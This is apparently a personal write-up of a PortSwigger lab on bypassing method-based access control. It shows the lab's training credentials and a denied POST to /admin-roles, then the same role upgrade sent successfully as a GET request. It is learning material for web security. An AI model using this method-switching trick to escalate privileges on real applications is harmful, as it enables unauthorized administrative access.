# Lab: Method-based access control can be circumvented 
url: https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented

# Overview:
- This lab implements access controls based partly on the HTTP method of requests. You can familiarize yourself with the admin panel by logging in using the credentials administrator:admin
- To solve  lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator

# Analysis:

Deny:

POST /admin-roles 

username=wiener&action=upgrade

I tried:

GET /admin-roles?username=wiener&action=upgrade 

-> <OK!>